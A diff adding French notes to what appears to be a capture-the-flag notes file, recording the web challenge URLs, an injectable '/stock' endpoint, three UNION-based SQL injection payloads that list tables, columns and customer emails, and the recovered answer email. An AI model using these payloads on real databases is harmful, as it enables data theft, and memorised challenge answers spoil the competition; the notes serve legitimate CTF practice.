@@ -8,6 +8,17 @@ Crypto:
 Web:
 ---
 
+- https://challengecybersec.fr/4e9033c6eacf38dc2a5df7a14526bec1/
+- https://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/
+
+SQLi => https://challengecybersec.fr/4e9033c6eacf38dc2a5df7a14526bec1/stock
+
+* Liste tables => ' UNION SELECT table_name,1,2,3,4 FROM information_schema.tables#
+* Liste colonnes de la table "customer" => ' UNION SELECT column_name,1,2,3,4 FROM information_schema.columns WHERE TABLE_NAME='customer'# 
+* Liste emails => ' UNION SELECT email,1,2,3,4 FROM customer#
+
+agent.malice@secret.evil.gov.ev
+
 =================================================================
 Algo:
 ----
